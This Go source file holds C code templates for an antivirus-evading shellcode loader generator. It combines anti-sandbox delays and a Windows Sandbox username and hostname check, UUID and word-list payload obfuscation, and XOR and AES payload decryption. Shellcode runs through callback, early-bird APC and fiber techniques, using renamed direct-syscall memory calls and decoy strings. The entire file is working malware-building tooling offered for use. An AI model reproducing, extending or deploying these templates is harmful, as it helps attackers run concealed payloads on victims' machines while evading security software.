package Loader

//VAVPVM	NtProtectVirtualMemory
//VAVWVM	NtWriteVirtualMemory
//VAVAVM	NtAllocateVirtualMemory

// 反沙箱代码
// 在主函数中调用
var __c__sandbox = `
	Love(1000000000000002493);
	Love(1000000000000002481);
	Love(1000000000000002319);
	Love(1000000000000002271);
	Love(1000000000000002217);
	Love(1000000000000002137);
	Love(1000000000000002097);
	//Love(1000000000000002049);
	//Love(1000000000000001953);
	//Love(1000000000000002481);

`

// 回调函数加载
var __c__syscall_callback = `
    DWORD oldProtect;
    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	Love(1000000000000002049);
    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	Love(1000000000000002049);
    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	Love(1000000000000002049);
	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
`
var __c__syscall__earlyBird = `
    LPVOID shellAddress = VirtualAlloc(NULL, allocationSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    memcpy(shellAddress, xpp, allocationSize);
    //WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, allocationSize, NULL);


    QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
    testAlert();
    //VAVAVM(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //VAVWVM(hProcess, addr, xpp, length, &bytesWritten);
    ////LPVOID addr1 = VirtualAlloc(NULL, sizeof(xpp), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ////RtlMoveMemory(addr1, xpp,length);
    ////QueueUserAPC((PAPCFUNC)addr1, GetCurrentThread(), NULL);
	//Sw3NtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
    //Sw3NtTestAlert();
`

// 纤程加载
var __c__syscall__fiber = `
    DWORD oldProtect;
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	Love(1000000000000002049);
    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	Love(1000000000000002049);
    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	Love(1000000000000002049);
	VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);

    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);

    SwitchToFiber(shellcodeFiber);
`

// uuid混淆
var __c__uuid = `
	const char* uuids[] = { %s };
	int num_uuids = sizeof(uuids) / sizeof(uuids[0]); 
    char* xpp = (char*)malloc(num_uuids * sizeof(UUID));

	if (xpp == NULL) {
		// 内存分配失败处理
		return -1;
	}
	for (int i = 0; i < num_uuids; i++) {
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)(xpp + i * sizeof(UUID)));
		if (status != RPC_S_OK) {
			free(xpp);
			return -1; // UUID 字符串转换失败
		}
	}
    unsigned int length = num_uuids * sizeof(UUID);

`

// english_words混淆模板
var __c__words = `
	const char* names[] = { %s };
    const char* name[] = { %s };
	unsigned char xpp[sizeof(name)];

    for (int sc_index = 0; sc_index < sizeof(xpp); sc_index++) {
        for (int tt_index = 0; tt_index < sizeof(names); tt_index++)
        {
            if (names[tt_index] == name[sc_index]) {
                xpp[sc_index] = tt_index;
                break;
            }
        }
    }
    unsigned int length = sizeof(name) / sizeof(name[0]);

`

// c xor 模板
var __c_xor = `
#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
REPLACE_STSYSCALL_Framework
#include <Rpc.h>

#define UNLEN 256
#define HOSTNAME_LEN 256

BOOL wsb_detect_user_and_hostname()
{
    WCHAR wcUser[UNLEN + 1];
    WCHAR wcHostname[HOSTNAME_LEN + 1];
    RtlSecureZeroMemory(wcUser, sizeof(wcUser));
    RtlSecureZeroMemory(wcHostname, sizeof(wcHostname));

    DWORD dwUserLength = (UNLEN + 1);
    DWORD dwHostnameLength = (HOSTNAME_LEN + 1);

    // 获取当前用户名
    if (!GetUserNameW(wcUser, &dwUserLength))
    {
        return FALSE;
    }

    // 获取计算机主机名
    if (GetComputerNameW(wcHostname, &dwHostnameLength))
    {
		//转小写
      	wcslwr(wcUser);
        wcslwr(wcHostname);
        // 检查用户名和主机名
        if (wcscmp(wcUser, L"johndoe") == 0 && wcscmp(wcHostname, L"hal9th") == 0)
        {
            return TRUE;
        }
    }

    return FALSE;
}

typedef VOID(NTAPI* myNtTestAlert)(VOID);


char url1[] = "https://www.google.com/search?q=";
char url3[] = "https://www.bing.com/search?q=";
char url2[] = "https://www.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=";
char filePath1[] = "C:/Users/username/Documents/file.txt";
char filePath2[] = "/home/user/documents/file.txt";
char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";


void ShowTime(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

bool Love(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
int main() {
	REPLACE_ANTI_SANDBOX

	REPLACR_OBFUSCATION
    unsigned char key[] = "%s";
    unsigned int key_len = sizeof(key);
    ShowTime((char*)xpp, length, (char*)key, key_len);

	SIZE_T allocationSize = length;
	void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;
}

`

// c aes 模板
var __c__aes = `

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <Windows.h>
#include <lmcons.h>
#include <lm.h>
#include "aes.h"
REPLACE_STSYSCALL_Framework

typedef VOID(NTAPI* myNtTestAlert)(VOID);

#define UNLEN 256
#define HOSTNAME_LEN 256

BOOL wsb_detect_user_and_hostname()
{
    WCHAR wcUser[UNLEN + 1];
    WCHAR wcHostname[HOSTNAME_LEN + 1];
    RtlSecureZeroMemory(wcUser, sizeof(wcUser));
    RtlSecureZeroMemory(wcHostname, sizeof(wcHostname));

    DWORD dwUserLength = (UNLEN + 1);
    DWORD dwHostnameLength = (HOSTNAME_LEN + 1);

    // 获取当前用户名
    if (!GetUserNameW(wcUser, &dwUserLength))
    {
        return FALSE;
    }

    // 获取计算机主机名
    if (GetComputerNameW(wcHostname, &dwHostnameLength))
    {
		//转小写
      	wcslwr(wcUser);
        wcslwr(wcHostname);
        // 检查用户名和主机名
        if (wcscmp(wcUser, L"johndoe") == 0 && wcscmp(wcHostname, L"hal9th") == 0)
        {
            return TRUE;
        }
    }

    return FALSE;
}


char url1[] = "https://www.google.com/search?q=";
char url3[] = "https://www.perplexity.ai/search";
char url2[] = "https://www.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=";
char filePath1[] = "C:/Users/username/Documents/file.txt";
char filePath2[] = "/home/user/documents/file.txt";
char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";
bool Love(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
int main() {
	 if (wsb_detect_user_and_hostname())
    {
        exit(0);
    }
	REPLACE_ANTI_SANDBOX

	REPLACR_OBFUSCATION
    uint8_t Key[] = "%s";
    uint8_t IV[] = "%s";
    struct AES_ctx ctx;

    init(&ctx, Key, IV);
    de_buffer(&ctx, xpp, length);

	void* addr = NULL;
	SIZE_T allocationSize = length;

	REPLACE_Loading_Technique

    free(xpp);

    return 0;
}


`
